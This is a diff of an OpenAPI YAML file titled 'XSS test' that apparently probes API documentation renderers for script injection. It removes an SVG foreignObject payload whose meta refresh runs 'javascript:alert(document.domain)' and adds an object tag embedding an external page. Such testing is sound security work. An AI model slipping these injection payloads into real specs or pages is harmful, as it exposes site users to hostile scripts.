@@ -3,7 +3,9 @@ info:
   title: "XSS test"
   version: "1.0.0"
   description: |
-    <svg><foreignObject width="100" height="50"><body xmlns="http://www.w3.org/1999/xhtml"><meta http-equiv="refresh" content="0;url=javascript:alert(document.domain)"></body></foreignObject></svg>
+    3) Object Tag
+description: |
+  <object data="https://bugcrowd.com" width="600" height="400"></object>
 paths:
   /x:
     get:
